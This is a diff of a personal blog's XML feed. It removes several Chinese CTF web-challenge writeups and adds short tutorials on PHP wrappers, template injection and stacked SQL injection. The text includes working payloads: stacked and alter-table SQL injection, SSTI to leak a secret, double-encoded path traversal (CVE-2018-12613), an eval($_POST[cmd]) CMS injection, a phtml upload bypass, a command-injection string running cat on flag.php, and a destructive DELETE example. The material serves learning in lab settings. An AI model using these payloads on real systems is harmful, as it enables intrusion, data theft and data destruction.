-<p>看到mysql_multi_query()，可以堆叠注入<br>首先可以用1;show tables%23查询到一个Flag表<br>但是源码里看到flag也被过滤了<br>查询语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag</span><br></pre></td></tr></table></figure>
-
-<p>看wp中有两种解法<br>一种是预期解<br>通过堆叠注入sql_mode的值为PIPES_AS_CONCAT</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
-
-<p>设置sql_mode为PIPES_AS_CONCAT后可改变’||’的含义为连接字符串。<br>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能<br>原语句中||的含义为或运算，当前面一个字段查询到数据时，就不会再执行（我的理解是这样）。改变语义后就是将前一个字段的查询结果和后一个字段查询结果进行拼接。这样两个字段都会被查询<br>构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
-
-<p>注入成功<br>另一种是非预期解，直接构造payload*,1<br>原sql语句变为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
-
-
-<p>而*号为查询所有数据，即实现了对flag的查询</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>easy_tornado</title>
-    <url>/2019/12/13/easy-tornado/</url>
-    <content><![CDATA[<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>进入题目网站，发现三个文件<br>flag.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure><p>发现flag在/fllllllllllllag文件里</p><p>welcome.txt</p><a id="more"></a>
-
-
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">Rende</span><br></pre></td></tr></table></figure>
-
-<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面<br>hints.txt</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
-
-
-<p>现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。</p>
-<p>到这就不知道怎么做了，根据查看大佬的writerup，才做出来的</p>
-<p>有签名错误，发现/error?msg=签名错误，考虑<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入（ssti攻击）</a><br>尝试输入/error?msg=1，确实是存在模板注入</p>
-<p>尝试输入/error?msg=49，不存在运算</p>
-<p>之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings,于是尝试输入/error?msg=</p>
-<p>发现 ‘cookie_secret’:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f52b1f85-76a5-4c65-8eb4-34e2aadbd140</span><br></pre></td></tr></table></figure>
-
-<p>加密代码如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(s.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line">    filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie_secret = <span class="string">'f52b1f85-76a5-4c65-8eb4-34e2aadbd140'</span></span><br><span class="line">    print(md5(cookie_secret + md5(filename)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">filehash()</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[强网杯 2019]随便注</title>
-    <url>/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
-<p>1‘ //首先尝试的加引号，报错了<br>1’ # //正常<br>1‘ order by 1 # //用order by 测试得到列数为2<br>1’ union select 1,2 # //回显了过滤规则 return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
+    <title>文件包含</title>
+    <url>/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p><blockquote>
+<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p>
 </blockquote><a id="more"></a>
-<p>看writeup 要用<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">堆叠注入</a>。。</p>
-<blockquote>
-<p>1’;show databases; #</p>
-</blockquote>
-<blockquote>
-<p>1’;show tables; # 发现两个表1919810931114514、words</p>
-</blockquote>
-<p>依次查询两张表的字段</p>
-<blockquote>
-<p>1’; show columns from 表名; #</p>
-</blockquote>
-<p>不过有点问题，只有words有回显。(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)</p>
-<p>内部查询语句类似 : select id, data from words where id =</p>
-<p>(这里从上面的对words列的查询可以看到它是有两列，id和data)</p>
-<p>然后1919810931114514只有一个flag字段</p>
-<p>这时候虽然有强大的正则过滤，但没有过滤alert和rename关键字</p>
-<p>这时候我们就可以已下面的骚姿势进行注入：</p>
-<blockquote>
-<p>1.将words表改名为word1或其它任意名字</p>
-</blockquote>
-<blockquote>
-<p>2.1919810931114514改名为words</p>
-</blockquote>
-<blockquote>
-<p>3.将新的word表插入一列，列名为id</p>
-</blockquote>
-<blockquote>
-<p>4.将flag列改名为data</p>
-</blockquote>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?inject=0&apos;;alter table words rename to word;alter table`1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10) default 1 --+</span><br></pre></td></tr></table></figure>
 
-<p>接着我们再用1’ or 1=1 #,查询就得到flag</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>php://filter在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
 <blockquote>
-<p>注：这里要注意几个问题：<br>•    对表名为纯数字的表进行操作时，要在前后加上`符号。由于刚开始不知道，在这卡了一段时间。<br>•    对列名进行更改时，要在后面指定修改后的数据类型<br>•    添加id列时，设置默认值，方便后面查询（1’ or 1=1也可）</p>
+<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 </p>
+<p>?path=php://filter/read=convert.base64-encode/resource=xxxxx.php</p>
 </blockquote>
 ]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
-      </tags>
   </entry>
   <entry>
-    <title>HCTF2018-warmup-writeup</title>
-    <url>/2019/12/13/HCTF2018-warmup-writeup/</url>
-    <content><![CDATA[<h1 id="HCTF2018-warmup-writeup"><a href="#HCTF2018-warmup-writeup" class="headerlink" title="HCTF2018-warmup-writeup"></a>HCTF2018-warmup-writeup</h1><p>​    打开是个滑稽图片，然后看源码，访问source.php</p><p>是一串代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+    <title>模块注入</title>
+    <url>/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h3 id="模板注入介绍"><a href="#模板注入介绍" class="headerlink" title="模板注入介绍"></a>模板注入介绍</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SQL 注入</span></span><br><span class="line">$query = <span class="string">"select * from sometable where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line"><span class="comment">// 模版注入</span></span><br><span class="line">$temp-&gt;render(<span class="string">"Hello "</span>.$_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><a id="more"></a>
 
-
-
-<p>hint.php文件，访问后的确有一个hint，提示我们flag在ffffllllaaaagggg文件中<br>几个函数</p>
 <blockquote>
-<p>mb_strpos($string, $a)：查找字符串a在字符串string中首次出现的位置，起始位置以0开始；</p>
-<p>mb_substr($string, $start, $end)：在字符串string中截取以start开始，以end结尾的子串；<br>可以看到函数代码中有四个if语句</p>
+<p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 </p>
 </blockquote>
-<p>第一个if语句对变量进行检验，要求$page为字符串，否则返回false<br>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true<br>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true</p>
-<p>若以上四个if语句均未返回值，则返回false<br>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://***:***/source.php?file=source.php%253f../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<h3 id="模板注入原理"><a href="#模板注入原理" class="headerlink" title="模板注入原理"></a>模板注入原理</h3><pre><code>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程。</code></pre><p>考虑下面这段代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>
 
-<p>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://***:***/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p>​    使用 Twig 模版引擎渲染页面，其中模版含有   变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击。</p>
+<p>​    如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>
 
-<p>中成功回显flag</p>
-<p>利用了CVE-2018-12613漏洞<br>这个漏洞利用了一个性值：如果将 ？双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hint.php%25%3F（%25%3F是?的二次编码）</span><br></pre></td></tr></table></figure>
+<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出。</p>
+<h3 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h3><p> Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>那么解析时会把hint.php当作一个目录来看。<br>于是该题的payload可以是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file=hint.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-
+<p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出</p>
 ]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-      </tags>
   </entry>
   <entry>
-    <title>“百度杯”CTF比赛 九月场</title>
-    <url>/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/</url>
-    <content><![CDATA[<h1 id="“百度杯”CTF比赛-九月场-Writeup"><a href="#“百度杯”CTF比赛-九月场-Writeup" class="headerlink" title="“百度杯”CTF比赛-九月场 Writeup"></a>“百度杯”CTF比赛-九月场 Writeup</h1><h2 id="一-Test"><a href="#一-Test" class="headerlink" title="一 : Test"></a>一 : Test</h2><p>​    海洋cms，<img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/1.png" alt></p><p>goolge查找以前的漏洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</span><br></pre></td></tr></table></figure><a id="more"></a>
-
-
-
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/2.png" alt></p>
-<p>找到数据库配置文件</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/3.png" alt></p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/4.png" alt></p>
-<p>进入数据库找到flag</p>
-<h2 id="二-123"><a href="#二-123" class="headerlink" title="二 :  123"></a>二 :  123</h2><p>​    f12看源码，提示用户信息在user.php,想到备份泄露，尝试user.php.bak得到文件</p>
-<p>然后进行bp爆破，用攻城锤模式</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/5.png" alt></p>
-<p>每次爆破改年份，最后是1990</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/6.png" alt></p>
-<p>用lixiuyun登录，f12看源码</p>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/7.png" alt></p>
-<p>f12把注释去掉，进行文件上传，发现不能包含php，用php别名</p>
-<blockquote>
-<p>php2, php3, php4, php5, phps, pht, phtm, phtml</p>
-</blockquote>
-<p><img src="/2019/12/02/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA/8.png" alt></p>
-<p>改成1.jpg.phtml成功</p>
-<p>然后访问<code>view.php</code></p>
-<p>直接<code>view.php?file=flag</code>，结果为<code>filter &quot;flag&quot;</code></p>
-<p>`双写绕过 </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view.php?file=flflagag</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-      </tags>
+    <title>堆叠注入</title>
+    <url>/2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<blockquote>
+<p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p>
+</blockquote><h4 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h4><blockquote>
+<p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p>
+</blockquote>]]></content>
   </entry>
   <entry>
-    <title>“百度杯”CTF比赛 2017 二月场</title>
-    <url>/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="“百度杯”CTF比赛-2017-二月场-Writeup"><a href="#“百度杯”CTF比赛-2017-二月场-Writeup" class="headerlink" title="“百度杯”CTF比赛 2017 二月场 Writeup"></a>“百度杯”CTF比赛 2017 二月场 Writeup</h3><h2 id="一-：-爆破-1"><a href="#一-：-爆破-1" class="headerlink" title="一 ： 爆破-1"></a>一 ： 爆破-1</h2><p>打开链接,看到php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
-
-
-<p>看到$$，应该是超全局变量</p>
-<p>直接构造payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://abc741867e084776a3f60edf23a17e75edbd3a30f5cb4047.changame.ichunqiu.com/?hello=GLOBALS</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/1.jpg" alt></p>
-<h2 id="二-爆破-2"><a href="#二-爆破-2" class="headerlink" title="二 :  爆破-2"></a>二 :  爆破-2</h2><p>打开链接，php代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>看到var_dump($a)，尝试用$GLOBALS</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://828a5642d838412dbeb8e07676951034a06796aaaccc4bfb.changame.ichunqiu.com/?hello=$GLOBALS</span><br></pre></td></tr></table></figure>
-
-<p>发现没有flag</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/2.jpg" alt></p>
-<p>看提示说没在变量中</p>
-<p>就尝试读取文件</p>
-<p>两种方法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?hello=file(&quot;flag.php&quot;)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?hello=);echo%20`cat%20./flag.php`;//</span><br></pre></td></tr></table></figure>
-
-<p>用的第二种</p>
-<p>eval语句就变成</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(&quot;var_dump();echo `cat ./flag.php`;//&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>F12查看源码,得到flag</p>
-<p><img src="/2019/12/01/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-2017-%E4%BA%8C%E6%9C%88%E5%9C%BA/3.jpg" alt></p>
-<h2 id="三-爆破-3"><a href="#三-爆破-3" class="headerlink" title="三 :  爆破-3"></a>三 :  爆破-3</h2><p>打开看php代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>每次都会$_SESSION[‘whoami’] = $str_rands;设置一个随机的值</p>
-<p>substr(md5($value),5,4)==0比较md5加密后的值是否为0，可以把value变成数组可以绕过</p>
-<blockquote>
-<p>因为md5加密一个数组值为null，而null==0 </p>
-</blockquote>
-<p>通过爆破10次后就可以得到flag;可以写python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://1eff6bf7980b4fe580e8f34167ccaa79fc87bd91ab174f10.changame.ichunqiu.com/'</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag&#123;.*&#125;'</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (html)</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
